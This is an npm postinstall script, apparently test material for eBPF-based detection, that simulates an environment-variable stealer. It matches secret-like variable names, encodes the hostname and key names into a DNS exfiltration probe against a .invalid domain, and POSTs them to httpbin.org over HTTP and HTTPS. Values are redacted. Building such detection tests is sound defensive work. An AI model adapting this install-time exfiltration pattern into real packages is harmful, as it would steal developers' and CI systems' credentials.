#!/usr/bin/env node
// postinstall.js — env-stealer-test
// Simulates an environment-variable exfiltration attack pattern.
// Real-world examples: event-stream, ua-parser-js hijack.
// Safe for testing: no secrets are actually sent; connection failures are non-fatal.
'use strict';

const os   = require('os');
const http = require('http');
const https = require('https');
const dns  = require('dns');

// ── 1. Harvest process.env for high-value keys ───────────────────────────────
// Real malware grabs AWS_*, GITHUB_TOKEN, NPM_TOKEN, CI secrets etc.
const sensitivePatterns = [
  /TOKEN/i, /SECRET/i, /KEY/i, /PASSWORD/i, /PASSWD/i,
  /AWS/i, /GITHUB/i, /GITLAB/i, /NPM/i, /CI/i, /TRAVIS/i,
  /CIRCLE/i, /HEROKU/i, /STRIPE/i, /TWILIO/i,
];

const harvested = {};
for (const [k, v] of Object.entries(process.env)) {
  if (sensitivePatterns.some((re) => re.test(k))) {
    // Do not print the actual value — the eBPF probe captures it anyway
    harvested[k] = `[REDACTED len=${v ? v.length : 0}]`;
  }
}

console.log('[env-stealer] Sensitive env keys found:', Object.keys(harvested));
console.log('[env-stealer] Total env keys scanned:', Object.keys(process.env).length);

// ── 2. Attempt DNS-over-HTTP exfiltration (common C2 technique) ──────────────
// Attacker encodes data as a subdomain to bypass HTTP egress filters.
// We use a safe domain; real malware uses attacker-owned DNS.
const encoded = Buffer.from(JSON.stringify({ host: os.hostname(), keys: Object.keys(harvested) }))
  .toString('base64')
  .replace(/=/g, '')
  .replace(/\+/g, '-')
  .replace(/\//g, '_')
  .slice(0, 50); // keep subdomain length sane

const dnsProbeHost = `${encoded}.dns-exfil.invalid`; // .invalid never resolves
dns.lookup(dnsProbeHost, (err) => {
  if (err) {
    console.log('[env-stealer] DNS exfil probe attempted to', dnsProbeHost, '(expected failure):', err.code);
  } else {
    console.log('[env-stealer] DNS exfil probe resolved (unexpected)');
  }
});

// ── 3. HTTP POST to attacker C2 (standard port 80) ───────────────────────────
// Payload is intentionally empty; the syscall+network event is what eBPF sees.
const payload = JSON.stringify({ hostname: os.hostname(), keys: Object.keys(harvested) });
const options = {
  hostname: 'httpbin.org',
  port: 80,
  path: '/post',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': Buffer.byteLength(payload),
    'User-Agent': 'npm/env-stealer-test', // masquerades as npm
  },
};

const req = http.request(options, (res) => {
  console.log('[env-stealer] HTTP POST to C2 (httpbin.org:80/post) — status:', res.statusCode);
  res.resume();
});
req.on('error', (err) => {
  console.log('[env-stealer] HTTP POST to C2 failed (non-fatal):', err.message);
});
req.write(payload);
req.end();

// ── 4. HTTPS POST on 443 (second exfil path) ─────────────────────────────────
const req2 = https.request({
  hostname: 'httpbin.org',
  port: 443,
  path: '/post',
  method: 'POST',
  headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) },
}, (res) => {
  console.log('[env-stealer] HTTPS POST to C2 (httpbin.org:443/post) — status:', res.statusCode);
  res.resume();
});
req2.on('error', (err) => {
  console.log('[env-stealer] HTTPS POST to C2 failed (non-fatal):', err.message);
});
req2.write(payload);
req2.end();

console.log('[env-stealer] env-exfiltration postinstall complete.');
